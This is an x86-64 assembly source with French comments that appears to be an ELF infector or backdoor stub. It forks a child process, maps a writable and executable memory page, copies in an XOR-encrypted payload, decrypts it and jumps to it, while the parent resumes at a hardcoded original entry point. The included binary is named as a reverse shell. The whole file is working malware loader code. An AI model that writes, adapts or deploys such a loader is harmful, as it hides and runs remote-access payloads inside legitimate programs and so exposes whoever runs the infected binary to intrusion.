BITS 64
global _start

_start:
    ; fork()
    xor     rax, rax
    mov     al, 57
    syscall
    test    rax, rax
    jnz     retour_pere

    ; FILS : mmap zone RWX
    xor     rdi, rdi
    mov     rsi, 0x1000
    mov     rdx, 7
    mov     r10, 0x22
    mov     r8, -1
    xor     r9, r9
    mov     rax, 9
    syscall
    mov     r15, rax

    ; copier payload chiffré dans zone RWX
    lea     rsi, [rel payload]
    mov     rdi, r15
    mov     rcx, payload_fin - payload
    mov     r14, rcx
    rep     movsb

    ; déchiffrer XOR 0x41
    mov     rsi, r15
    mov     rcx, r14
dechiffre:
    xor     byte [rsi], 0x41
    inc     rsi
    loop    dechiffre

    ; sauter vers shellcode déchiffré
    jmp     r15

    ; PÈRE : retour à e_entry original
retour_pere:
    mov     rax, 0x401000
    jmp     rax

payload:
    incbin "payload/reverse_shell_core_xor.bin"
payload_fin: